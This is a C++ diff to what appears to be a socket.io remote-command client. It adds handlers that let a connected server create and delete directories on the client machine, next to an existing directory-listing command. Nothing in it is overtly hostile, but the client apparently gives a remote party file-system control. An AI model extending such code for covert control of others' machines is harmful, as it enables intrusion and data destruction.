@@ -69,6 +69,16 @@ namespace silence
         thread.detach();
     }
 
+    void Client::sendResponse(bool variable, const std::string &event,
+                              const std::string &errorMsg,
+                              const std::string &infoMsg)
+    {
+        if (!variable)
+            error(event, errorMsg);
+        else
+            info(infoMsg);
+    }
+
     void Client::onCommand(std::string const &name,
                            sio::message::ptr const &data,
                            bool hasAck,
@@ -91,6 +101,12 @@ namespace silence
         else if (event == "listdir")
             launchEvent<void(const CommandObject &)>(
                 std::bind(&Client::listDirEvent, this, _1), commandObject);
+        else if (event == "mkdir")
+            launchEvent<void(const CommandObject &)>(
+                std::bind(&Client::mkDirEvent, this, _1), commandObject);
+        else if (event == "rmdir")
+            launchEvent<void(const CommandObject &)>(
+                std::bind(&Client::removeDirEvent, this, _1), commandObject);
         else
             error(event, "Unknown event");
     }
@@ -168,6 +184,20 @@ namespace silence
             dirList->get_vector().push_back(sio::string_message::create(entry.path()));
 
         mSocket->emit("directory", dirList);
+    }
+
+    void Client::mkDirEvent(const CommandObject &object)
+    {
+        sendResponse(fs::create_directories(object.at("path")->get_string()),
+                     "mkdir", "fs::create_directories failed",
+                     "Successfully created directory");
+    }
+
+    void Client::removeDirEvent(const CommandObject &object)
+    {
+        sendResponse(fs::remove(object.at("path")->get_string()),
+                     "rmdir", "fs::remove failed",
+                     "Successfully deleted directory");
     }
 
     void Client::error(const std::string &event, const std::string &msg)
